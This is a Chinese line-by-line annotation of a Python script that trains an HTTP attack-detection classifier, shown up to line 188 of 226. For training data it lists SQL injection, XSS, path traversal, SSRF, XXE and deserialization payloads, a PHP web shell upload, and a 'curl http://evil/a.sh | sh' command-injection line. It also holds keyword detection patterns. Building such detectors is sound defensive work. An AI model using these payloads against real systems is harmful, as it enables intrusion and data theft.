# `scripts/train_payload_model_v2.py` 逐行注释

**脚本用途：** 训练 Payload 文本/特征模型并保存模型与评估结果。

**源码行数：** 226　**函数/类数量：** 5

| 行号 | 中文说明 | 原始源码 |
|---:|---|---|
| L0001 | 导入后续逻辑所需的模块、类或函数：&#96;from __future__ import annotations&#96;。 | <code>from __future__ import annotations</code> |
| L0002 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0003 | 导入后续逻辑所需的模块、类或函数：&#96;import argparse&#96;。 | <code>import argparse</code> |
| L0004 | 导入后续逻辑所需的模块、类或函数：&#96;import json&#96;。 | <code>import json</code> |
| L0005 | 导入后续逻辑所需的模块、类或函数：&#96;import random&#96;。 | <code>import random</code> |
| L0006 | 导入后续逻辑所需的模块、类或函数：&#96;from collections import Counter&#96;。 | <code>from collections import Counter</code> |
| L0007 | 导入后续逻辑所需的模块、类或函数：&#96;from datetime import datetime&#96;。 | <code>from datetime import datetime</code> |
| L0008 | 导入后续逻辑所需的模块、类或函数：&#96;from pathlib import Path&#96;。 | <code>from pathlib import Path</code> |
| L0009 | 导入后续逻辑所需的模块、类或函数：&#96;from typing import Dict, List, Tuple&#96;。 | <code>from typing import Dict, List, Tuple</code> |
| L0010 | 导入后续逻辑所需的模块、类或函数：&#96;from urllib.parse import quote_plus&#96;。 | <code>from urllib.parse import quote_plus</code> |
| L0011 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0012 | 导入后续逻辑所需的模块、类或函数：&#96;import joblib&#96;。 | <code>import joblib</code> |
| L0013 | 导入后续逻辑所需的模块、类或函数：&#96;import pandas as pd&#96;。 | <code>import pandas as pd</code> |
| L0014 | 导入后续逻辑所需的模块、类或函数：&#96;from sklearn.feature_extraction.text import TfidfVectorizer&#96;。 | <code>from sklearn.feature_extraction.text import TfidfVectorizer</code> |
| L0015 | 导入后续逻辑所需的模块、类或函数：&#96;from sklearn.linear_model import LogisticRegression&#96;。 | <code>from sklearn.linear_model import LogisticRegression</code> |
| L0016 | 导入后续逻辑所需的模块、类或函数：&#96;from sklearn.metrics import accuracy_score, classification_report, confusion_matrix, f1_score&#96;。 | <code>from sklearn.metrics import accuracy_score, classification_report, confusion_matrix, f1_score</code> |
| L0017 | 导入后续逻辑所需的模块、类或函数：&#96;from sklearn.model_selection import train_test_split&#96;。 | <code>from sklearn.model_selection import train_test_split</code> |
| L0018 | 导入后续逻辑所需的模块、类或函数：&#96;from sklearn.pipeline import Pipeline&#96;。 | <code>from sklearn.pipeline import Pipeline</code> |
| L0019 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0020 | 导入后续逻辑所需的模块、类或函数：&#96;from security_detection_v2 import extract_request_from_record, is_simple_page_view, payload_model_text&#96;。 | <code>from security_detection_v2 import extract_request_from_record, is_simple_page_view, payload_model_text</code> |
| L0021 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0022 | 计算并保存 &#96;PROJECT_ROOT&#96;（PROJECTROOT），供后续逻辑使用。 | <code>PROJECT_ROOT = Path(__file__).resolve().parent.parent</code> |
| L0023 | 计算并保存 &#96;DEFAULT_OUT&#96;（DEFAULTOUT），供后续逻辑使用。 | <code>DEFAULT_OUT = PROJECT_ROOT / "output" / "detection_v2"</code> |
| L0024 | 计算并保存 &#96;DEFAULT_MODEL&#96;（DEFAULT模型），供后续逻辑使用。 | <code>DEFAULT_MODEL = PROJECT_ROOT / "models" / "payload_model_v2.joblib"</code> |
| L0025 | 计算并保存 &#96;SERVER_ROWS&#96;（SERVER数据库记录），供后续逻辑使用。 | <code>SERVER_ROWS = PROJECT_ROOT / "output" / "server_all_joined_rows.json"</code> |
| L0026 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0027 | 计算并保存 &#96;NORMAL_PATHS&#96;（NORMALPATHS），供后续逻辑使用。 | <code>NORMAL_PATHS = ["/", "/login", "/sql", "/xss", "/upload", "/command", "/traversal", "/ssrf", "/xxe", "/deserialize", "/graphql", "/ssti", "/bruteforce", "/api/products", "/api/search", "/api/profile", "/assets/app.js", "/favicon.ico"]</code> |
| L0028 | 计算并保存 &#96;NORMAL_QUERIES&#96;（NORMALQUERIES），供后续逻辑使用。 | <code>NORMAL_QUERIES = ["hello", "admin", "report", "测试", "product 123", "status ok", "select a city", "union station", "script writing", "orange and apple"]</code> |
| L0029 | 计算并保存 &#96;NORMAL_USERNAMES&#96;（NORMALUSERNAMES），供后续逻辑使用。 | <code>NORMAL_USERNAMES = ["admin", "user", "guest", "alice", "bob", "operator", "security", "test01", "zhangsan", "lisi"]</code> |
| L0030 | 计算并保存 &#96;NORMAL_PASSWORDS&#96;（NORMALPASSWORDS），供后续逻辑使用。 | <code>NORMAL_PASSWORDS = [</code> |
| L0031 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "admin",</code> |
| L0032 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "123456",</code> |
| L0033 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "wrongpass",</code> |
| L0034 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "hello2026",</code> |
| L0035 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "correct-password",</code> |
| L0036 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "P@ssw0rd2026!",</code> |
| L0037 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "ExamplePass2026",</code> |
| L0038 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "Qwer1234!",</code> |
| L0039 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "summer2026",</code> |
| L0040 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "normal_login_001",</code> |
| L0041 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>]</code> |
| L0042 | 计算并保存 &#96;USER_AGENTS&#96;（USERAGENTS），供后续逻辑使用。 | <code>USER_AGENTS = ["Mozilla/5.0", "Chrome/126.0", "Edge/126.0", "curl/8.0", "PostmanRuntime/7.37", "python-requests/2.31"]</code> |
| L0043 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0044 | 计算并保存 &#96;ATTACK_PAYLOADS&#96;（攻击PAYLOADS），供后续逻辑使用。 | <code>ATTACK_PAYLOADS = {</code> |
| L0045 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "SQL注入": ["' or 1=1 -- ", "admin'--", "' UNION SELECT username,password FROM users--", "1 AND SLEEP(3)", "1' OR 'a'='a", "1;SELECT * FROM information_schema.tables", "1' and extractvalue(1,concat(0x7e,user()))--"],</code> |
| L0046 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "XSS": ["&lt;script&gt;alert(1)&lt;/script&gt;", "&lt;img src=x onerror=alert(1)&gt;", "javascript:alert(document.cookie)", "&lt;svg onload=alert(1)&gt;", "\"&gt;&lt;script&gt;fetch('/cookie')&lt;/script&gt;", "&lt;body onload=confirm(1)&gt;"] ,</code> |
| L0047 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "命令注入": ["127.0.0.1;whoami", "127.0.0.1 &amp;&amp; cat /etc/passwd", "localhost &#124; powershell -enc AAA", "8.8.8.8&#96;id&#96;", "test$(uname -a)", "127.0.0.1; curl http://evil/a.sh &#124; sh"],</code> |
| L0048 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "路径遍历": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd", "/var/www/../../etc/shadow"],</code> |
| L0049 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "SSRF": ["http://127.0.0.1:8080/admin", "http://localhost/server-status", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "http://192.168.1.1/config"],</code> |
| L0050 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "XXE": ["&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;", "&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"http://evil/xxe\"&gt; ]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;"],</code> |
| L0051 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "SSTI": ["{{7*7}}", "{{config.__class__}}", "${7*7}", "{{''.__class__.__mro__[1].__subclasses__()}}"],</code> |
| L0052 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "危险文件上传": ["filename=cmd.php\r\nContent-Type: application/x-php\r\n\r\n&lt;?php system($_GET['cmd']); ?&gt;", "filename=shell.phtml", "filename=shell.jsp\r\nContent-Type: application/octet-stream", "filename=run.ps1\r\nWrite-Host pwned"],</code> |
| L0053 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "反序列化": ["rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "aced000573720011", "O:8:\"Exploit\":1:{s:3:\"cmd\";s:6:\"whoami\";}", "pickle.loads(base64.b64decode(payload))"],</code> |
| L0054 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "GraphQL探测": ["{__schema{types{name}}}", "query IntrospectionQuery { __schema { queryType { name } } }", "{__type(name:\"User\"){fields{name}}}"],</code> |
| L0055 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>}</code> |
| L0056 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0057 | 计算并保存 &#96;ATTACK_ENDPOINTS&#96;（攻击ENDPOINTS），供后续逻辑使用。 | <code>ATTACK_ENDPOINTS = {</code> |
| L0058 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "SQL注入": [("POST", "/api/auth/login", "json", "password"), ("GET", "/api/item?id={payload}", "query", "id"), ("GET", "/api/search?q={payload}", "query", "q")],</code> |
| L0059 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "XSS": [("GET", "/api/search?q={payload}", "query", "q"), ("POST", "/api/comment", "json", "content")],</code> |
| L0060 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "命令注入": [("POST", "/api/system/ping", "json", "host"), ("GET", "/api/tools/lookup?host={payload}", "query", "host")],</code> |
| L0061 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "路径遍历": [("GET", "/api/file/read?path={payload}", "query", "path"), ("GET", "/download?file={payload}", "query", "file")],</code> |
| L0062 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "SSRF": [("POST", "/api/fetch", "json", "url"), ("GET", "/api/proxy?url={payload}", "query", "url")],</code> |
| L0063 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "XXE": [("POST", "/api/xml/import", "xml", "xml")],</code> |
| L0064 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "SSTI": [("POST", "/api/template/render", "json", "template"), ("GET", "/api/render?name={payload}", "query", "name")],</code> |
| L0065 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "危险文件上传": [("POST", "/api/upload", "multipart", "file")],</code> |
| L0066 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "反序列化": [("POST", "/api/object/load", "json", "payload")],</code> |
| L0067 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "GraphQL探测": [("POST", "/graphql", "json", "query")],</code> |
| L0068 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>}</code> |
| L0069 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0070 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0071 | 定义makerecord函数 &#96;make_record&#96;，封装可复用业务逻辑。 | <code>def make_record(method: str, uri: str, body: str = "", content_type: str = "", status_code: int = 200, source_ip: str = "10.0.0.8") -&gt; Dict:</code> |
| L0072 | 计算并保存 &#96;host&#96;（host），供后续逻辑使用，当前位于函数 make_record。 | <code>    host = random.choice(["ctf.ski:4000", "example.local", "127.0.0.1:4000"])</code> |
| L0073 | 计算并保存 &#96;ua&#96;（ua），供后续逻辑使用，当前位于函数 make_record。 | <code>    ua = random.choice(USER_AGENTS)</code> |
| L0074 | 计算并保存 &#96;headers&#96;（headers），供后续逻辑使用，当前位于函数 make_record。 | <code>    headers = [f"{method} {uri} HTTP/1.1", f"Host: {host}", f"User-Agent: {ua}"]</code> |
| L0075 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 make_record。 | <code>    if content_type:</code> |
| L0076 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 make_record。 | <code>        headers.append(f"Content-Type: {content_type}")</code> |
| L0077 | 计算并保存 &#96;raw&#96;（raw），供后续逻辑使用，当前位于函数 make_record。 | <code>    raw = "\n".join(headers) + "\nBody:\n" + (body or "")</code> |
| L0078 | 结束当前函数并把结果返回给调用方，当前位于函数 make_record。 | <code>    return {"method": method, "uri": uri, "host": host, "status_code": status_code, "content_type": content_type, "user_agent": ua, "request_content": raw, "request_text_summary": f"METHOD={method}\nURI={uri}\nHOST={host}\nCONTENT_TYPE={content_type}\nSTATUS_CODE={status_code}\nREQUEST_BODY={body}", "source_ip": source_ip, "attack_ip": source_ip}</code> |
| L0079 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0080 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0081 | 定义渲染攻击函数 &#96;render_attack&#96;，封装可复用业务逻辑。 | <code>def render_attack(label: str, payload: str) -&gt; Dict:</code> |
| L0082 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 render_attack。 | <code>    method, endpoint, kind, field = random.choice(ATTACK_ENDPOINTS[label])</code> |
| L0083 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 render_attack。 | <code>    if kind == "query":</code> |
| L0084 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 render_attack。 | <code>        uri = endpoint.format(payload=quote_plus(payload))</code> |
| L0085 | 结束当前函数并把结果返回给调用方，当前位于函数 render_attack。 | <code>        return make_record(method, uri, "", "", random.choice([200, 400, 500]))</code> |
| L0086 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 render_attack。 | <code>    if kind == "json":</code> |
| L0087 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 render_attack。 | <code>        body = json.dumps({field: payload, "username": "admin"}, ensure_ascii=False)</code> |
| L0088 | 结束当前函数并把结果返回给调用方，当前位于函数 render_attack。 | <code>        return make_record(method, endpoint, body, "application/json", random.choice([200, 401, 500]))</code> |
| L0089 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 render_attack。 | <code>    if kind == "xml":</code> |
| L0090 | 结束当前函数并把结果返回给调用方，当前位于函数 render_attack。 | <code>        return make_record(method, endpoint, payload, "application/xml", random.choice([200, 400, 500]))</code> |
| L0091 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 render_attack。 | <code>    if kind == "multipart":</code> |
| L0092 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 render_attack。 | <code>        body = "------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; " + payload</code> |
| L0093 | 结束当前函数并把结果返回给调用方，当前位于函数 render_attack。 | <code>        return make_record(method, endpoint, body, "multipart/form-data; boundary=----WebKitFormBoundary", random.choice([200, 400]))</code> |
| L0094 | 结束当前函数并把结果返回给调用方，当前位于函数 render_attack。 | <code>    return make_record(method, endpoint, payload)</code> |
| L0095 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0096 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0097 | 定义generatesynthetic函数 &#96;generate_synthetic&#96;，封装可复用业务逻辑。 | <code>def generate_synthetic(seed: int, normal_n: int, per_attack_n: int) -&gt; List[Tuple[str, str, Dict]]:</code> |
| L0098 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 generate_synthetic。 | <code>    random.seed(seed)</code> |
| L0099 | 计算并保存 &#96;samples&#96;（samples），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>    samples: List[Tuple[str, str, Dict]] = []</code> |
| L0100 | 遍历集合中的数据项并逐项处理，当前位于函数 generate_synthetic。 | <code>    for _ in range(normal_n):</code> |
| L0101 | 计算并保存 &#96;path&#96;（path），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>        path = random.choice(NORMAL_PATHS)</code> |
| L0102 | 计算并保存 &#96;method&#96;（method），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>        method = random.choices(["GET", "POST"], weights=[0.75, 0.25])[0]</code> |
| L0103 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 generate_synthetic。 | <code>        if method == "GET":</code> |
| L0104 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 generate_synthetic。 | <code>            if path == "/api/search" or random.random() &lt; 0.25:</code> |
| L0105 | 计算并保存 &#96;q&#96;（q），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>                q = quote_plus(random.choice(NORMAL_QUERIES))</code> |
| L0106 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>                uri = f"{path}?q={q}" if "?" not in path else path</code> |
| L0107 | 处理前述条件均未命中的情况，当前位于函数 generate_synthetic。 | <code>            else:</code> |
| L0108 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>                uri = path</code> |
| L0109 | 计算并保存 &#96;rec&#96;（rec），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            rec = make_record("GET", uri, "", "", random.choice([200, 200, 200, 404]))</code> |
| L0110 | 处理前述条件均未命中的情况，当前位于函数 generate_synthetic。 | <code>        else:</code> |
| L0111 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            uri = random.choice(["/api/auth/login", "/api/comment", "/api/profile", "/api/upload", "/api/search"])</code> |
| L0112 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            body = json.dumps({"username": random.choice(NORMAL_USERNAMES), "password": random.choice(NORMAL_PASSWORDS), "content": random.choice(NORMAL_QUERIES)}, ensure_ascii=False)</code> |
| L0113 | 计算并保存 &#96;rec&#96;（rec），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            rec = make_record("POST", uri, body, "application/json", random.choice([200, 401, 403]))</code> |
| L0114 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_synthetic。 | <code>        samples.append(("normal", payload_model_text(extract_request_from_record(rec)), rec))</code> |
| L0115 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0116 | 源码原注释：Hard negatives: real login traffic contains username/password fields, but the | <code>    # Hard negatives: real login traffic contains username/password fields, but the</code> |
| L0117 | 源码原注释：field names alone must not make the model learn "SQL injection". | <code>    # field names alone must not make the model learn "SQL injection".</code> |
| L0118 | 遍历集合中的数据项并逐项处理，当前位于函数 generate_synthetic。 | <code>    for _ in range(max(1200, normal_n // 5)):</code> |
| L0119 | 计算并保存 &#96;username&#96;（username），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>        username = random.choice(NORMAL_USERNAMES)</code> |
| L0120 | 控制当前循环或占位分支的执行流程，当前位于函数 generate_synthetic。 | <code>        password = random.choice(NORMAL_PASSWORDS)</code> |
| L0121 | 计算并保存 &#96;body_shape&#96;（bodyshape），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>        body_shape = random.choice(["json", "form"])</code> |
| L0122 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 generate_synthetic。 | <code>        if body_shape == "json":</code> |
| L0123 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            body = json.dumps({"username": username, "password": password}, ensure_ascii=False)</code> |
| L0124 | 计算并保存 &#96;rec&#96;（rec），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            rec = make_record("POST", "/api/auth/login", body, "application/json", random.choice([200, 200, 401]))</code> |
| L0125 | 处理前述条件均未命中的情况，当前位于函数 generate_synthetic。 | <code>        else:</code> |
| L0126 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            body = f"username={quote_plus(username)}&amp;password={quote_plus(password)}"</code> |
| L0127 | 计算并保存 &#96;rec&#96;（rec），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            rec = make_record("POST", "/login", body, "application/x-www-form-urlencoded", random.choice([200, 302, 401]))</code> |
| L0128 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_synthetic。 | <code>        samples.append(("normal", payload_model_text(extract_request_from_record(rec)), rec))</code> |
| L0129 | 遍历集合中的数据项并逐项处理，当前位于函数 generate_synthetic。 | <code>    for label, payloads in ATTACK_PAYLOADS.items():</code> |
| L0130 | 遍历集合中的数据项并逐项处理，当前位于函数 generate_synthetic。 | <code>        for _ in range(per_attack_n):</code> |
| L0131 | 计算并保存 &#96;payload&#96;（payload），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            payload = random.choice(payloads)</code> |
| L0132 | 源码原注释：add small enc/spacing variations | <code>            # add small enc/spacing variations</code> |
| L0133 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 generate_synthetic。 | <code>            if random.random() &lt; 0.25:</code> |
| L0134 | 计算并保存 &#96;payload&#96;（payload），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>                payload = quote_plus(payload)</code> |
| L0135 | 计算并保存 &#96;rec&#96;（rec），供后续逻辑使用，当前位于函数 generate_synthetic。 | <code>            rec = render_attack(label, payload)</code> |
| L0136 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_synthetic。 | <code>            samples.append((label, payload_model_text(extract_request_from_record(rec)), rec))</code> |
| L0137 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 generate_synthetic。 | <code>    random.shuffle(samples)</code> |
| L0138 | 结束当前函数并把结果返回给调用方，当前位于函数 generate_synthetic。 | <code>    return samples</code> |
| L0139 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0140 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0141 | 定义加载serverhardsamples函数 &#96;load_server_hard_samples&#96;，封装可复用业务逻辑。 | <code>def load_server_hard_samples(path: Path) -&gt; List[Tuple[str, str, Dict]]:</code> |
| L0142 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 load_server_hard_samples。 | <code>    if not path.exists():</code> |
| L0143 | 结束当前函数并把结果返回给调用方，当前位于函数 load_server_hard_samples。 | <code>        return []</code> |
| L0144 | 计算并保存 &#96;rows&#96;（数据库记录），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>    rows = json.loads(path.read_text(encoding="utf-8-sig"))</code> |
| L0145 | 计算并保存 &#96;out&#96;（out），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>    out: List[Tuple[str, str, Dict]] = []</code> |
| L0146 | 遍历集合中的数据项并逐项处理，当前位于函数 load_server_hard_samples。 | <code>    for row in rows:</code> |
| L0147 | 计算并保存 &#96;ev&#96;（ev），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>        ev = extract_request_from_record(row)</code> |
| L0148 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>        uri = str(ev.get("uri") or "")</code> |
| L0149 | 计算并保存 &#96;old_type&#96;（oldtype），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>        old_type = str(row.get("attack_type") or "")</code> |
| L0150 | 计算并保存 &#96;label&#96;（label），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>        label = None</code> |
| L0151 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 load_server_hard_samples。 | <code>        if is_simple_page_view(ev):</code> |
| L0152 | 计算并保存 &#96;label&#96;（label），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>            label = "normal"</code> |
| L0153 | 当前一条件未命中时继续判断另一条件，当前位于函数 load_server_hard_samples。 | <code>        elif "&lt;script" in uri.lower() or "onerror" in uri.lower():</code> |
| L0154 | 计算并保存 &#96;label&#96;（label），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>            label = "XSS"</code> |
| L0155 | 当前一条件未命中时继续判断另一条件，当前位于函数 load_server_hard_samples。 | <code>        elif "../" in uri or "%2e%2e" in uri.lower() or "etc/passwd" in uri.lower():</code> |
| L0156 | 计算并保存 &#96;label&#96;（label），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>            label = "路径遍历"</code> |
| L0157 | 当前一条件未命中时继续判断另一条件，当前位于函数 load_server_hard_samples。 | <code>        elif any(x in (ev.get("body") or "").lower() for x in [" or 1=1", "union select", "sleep(", "information_schema"]):</code> |
| L0158 | 计算并保存 &#96;label&#96;（label），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>            label = "SQL注入"</code> |
| L0159 | 当前一条件未命中时继续判断另一条件，当前位于函数 load_server_hard_samples。 | <code>        elif any(x in (ev.get("body") or "").lower() for x in ["whoami", "cat /etc/passwd", "powershell", ";", "&amp;&amp;"]):</code> |
| L0160 | 计算并保存 &#96;label&#96;（label），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>            label = "命令注入"</code> |
| L0161 | 当前一条件未命中时继续判断另一条件，当前位于函数 load_server_hard_samples。 | <code>        elif "SQL" in old_type and not is_simple_page_view(ev):</code> |
| L0162 | 计算并保存 &#96;label&#96;（label），供后续逻辑使用，当前位于函数 load_server_hard_samples。 | <code>            label = "SQL注入"</code> |
| L0163 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 load_server_hard_samples。 | <code>        if label:</code> |
| L0164 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 load_server_hard_samples。 | <code>            out.append((label, payload_model_text(ev), row))</code> |
| L0165 | 结束当前函数并把结果返回给调用方，当前位于函数 load_server_hard_samples。 | <code>    return out</code> |
| L0166 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0167 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0168 | 定义main函数 &#96;main&#96;，封装可复用业务逻辑。 | <code>def main() -&gt; None:</code> |
| L0169 | 计算并保存 &#96;parser&#96;（parser），供后续逻辑使用，当前位于函数 main。 | <code>    parser = argparse.ArgumentParser(description="Train v2 HTTP payload model")</code> |
| L0170 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--output-dir", default=str(DEFAULT_OUT))</code> |
| L0171 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--model-out", default=str(DEFAULT_MODEL))</code> |
| L0172 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--normal-n", type=int, default=8000)</code> |
| L0173 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--per-attack-n", type=int, default=1200)</code> |
| L0174 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--seed", type=int, default=42)</code> |
| L0175 | 计算并保存 &#96;args&#96;（args），供后续逻辑使用，当前位于函数 main。 | <code>    args = parser.parse_args()</code> |
| L0176 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0177 | 计算并保存 &#96;out_dir&#96;（outdir），供后续逻辑使用，当前位于函数 main。 | <code>    out_dir = Path(args.output_dir)</code> |
| L0178 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    out_dir.mkdir(parents=True, exist_ok=True)</code> |
| L0179 | 计算并保存 &#96;model_out&#96;（模型out），供后续逻辑使用，当前位于函数 main。 | <code>    model_out = Path(args.model_out)</code> |
| L0180 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    model_out.parent.mkdir(parents=True, exist_ok=True)</code> |
| L0181 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0182 | 计算并保存 &#96;samples&#96;（samples），供后续逻辑使用，当前位于函数 main。 | <code>    samples = generate_synthetic(args.seed, args.normal_n, args.per_attack_n)</code> |
| L0183 | 计算并保存 &#96;server_samples&#96;（serversamples），供后续逻辑使用，当前位于函数 main。 | <code>    server_samples = load_server_hard_samples(SERVER_ROWS)</code> |
| L0184 | 源码原注释：oversample server hard negatives/positives because they represent the real failure mode. | <code>    # oversample server hard negatives/positives because they represent the real failure mode.</code> |
| L0185 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 main。 | <code>    samples.extend(server_samples * 3)</code> |
| L0186 | 计算并保存 &#96;labels&#96;（labels），供后续逻辑使用，当前位于函数 main。 | <code>    labels = [x[0] for x in samples]</code> |
| L0187 | 计算并保存 &#96;texts&#96;（texts），供后续逻辑使用，当前位于函数 main。 | <code>    texts = [x[1] for x in samples]</code> |
| L0188 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
